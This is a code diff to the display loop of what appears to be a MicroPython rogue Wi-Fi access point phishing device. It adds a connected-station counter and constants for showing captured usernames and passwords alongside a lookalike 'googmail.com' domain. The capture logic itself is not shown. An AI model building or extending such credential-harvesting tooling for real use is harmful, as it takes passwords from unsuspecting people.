@@ -34,6 +34,12 @@ last_capture = {}
 amount_of_captures = 0
 DOMAIN = 'googmail.com'
 amount_of_previous_capture_files = len(os.listdir("captures")) + 1
+last_connection_update = time.time()
+connections = 0
+
+UPDATE_TIME = 7
+CAPTURE_DISPLAY_TIME = 7
+MAX_CHAR_LENGTH = 16
 
 # Loading animations and files
 with open("animations/cat_sleeping.json", "r") as cat_sleeping_file:
@@ -65,8 +71,9 @@ SUCCESS_RESPONSE = server.Response(status=200, headers={"Content-Type": "text/ht
 
 # Animation function
 def animate():
-    global VERSION, oled, cat_sleeping_animation, cat_captured_animation, direction, count, FRAMES_NUM, captured_time, WAITING, last_capture, amount_of_captures, start_time, amount_of_previous_capture_files
-
+    global VERSION, oled, cat_sleeping_animation, cat_captured_animation, direction, count, FRAMES_NUM, wlan_AP_IF, connections, UPDATE_TIME, MAX_CHAR_LENGTH
+    global captured_time, WAITING, last_capture, amount_of_captures, start_time, amount_of_previous_capture_files, last_connection_update, CAPTURE_DISPLAY_TIME
+    
     while True:
         oled.fill(1)
         
@@ -74,8 +81,23 @@ def animate():
         oled.rect(0, 0, 128, 15, 0, True)
         oled.text(f"v{VERSION}",0,55,0)
         
+        
+
+                
         #Executed while waiting for a capture
         if WAITING:
+            
+            '''
+            Check if there exists any connections to the access point
+            Set to check every 10 seconds, having it run on the main
+            loop every 0.5 seconds overwhelm the interface
+            '''
+            if time.time() - last_connection_update > UPDATE_TIME:
+                last_connection_update = time.time()
+                connections = len(wlan_AP_IF.status("stations"))
+
+            
+            oled.text(f"{{{connections:02d}}}", 128-(len(str(amount_of_previous_capture_files))+2)*8 - 2,55,0)
             
             #Calculate uptime and display it in hh:mm:ss
             current_time = time.time() - start_time  
@@ -86,7 +108,8 @@ def animate():
             oled.text(f"({amount_of_captures:02})", 0, 5, 1)
             oled.text(f"UP{hours:02d}:{minutes:02d}:{seconds:02d}", 45, 5, 1)
             
-            if len(wlan_AP_IF.config('essid')) > 16:
+            #Formatting to show a '-' at the end if text don't fit
+            if len(wlan_AP_IF.config('essid')) > MAX_CHAR_LENGTH:
                 formatted_ap_name = wlan_AP_IF.config('essid')[:15] + '-'
             else:
                 formatted_ap_name = wlan_AP_IF.config('essid')
@@ -100,15 +123,15 @@ def animate():
         else:
             frame_content = cat_captured_animation[count]
             oled.text(f"({amount_of_captures:02}) {last_capture['website']}", 0, 5, 1)
-            oled.text(f"[{amount_of_previous_capture_files}]", 128-(len(str(amount_of_previous_capture_files))+2)*8 - 2,55,0)
+            oled.text(f"[{amount_of_previous_capture_files:02d}]", 128-(len(str(amount_of_previous_capture_files))+2)*8 - 2,55,0)
             
             #Formatting to show a '-' at the end if text don't fit
-            if len(last_capture['username']) > 16:
+            if len(last_capture['username']) > MAX_CHAR_LENGTH:
                 formatted_username = last_capture['username'][:15] + '-'
             else:
                 formatted_username = last_capture['username'][:15]
 
-            if len(last_capture['password']) > 16:
+            if len(last_capture['password']) > MAX_CHAR_LENGTH:
                 formatted_password = last_capture['password'][:15] + '-'
             else:
                 formatted_password = last_capture['password']
@@ -117,7 +140,7 @@ def animate():
             oled.text(formatted_password, 0, 28, 0)
             
             #Display the capture for 5 seconds
-            if time.time() - captured_time > 5:
+            if time.time() - captured_time >  CAPTURE_DISPLAY_TIME:
                 WAITING = True
                 last_capture = {}
                 
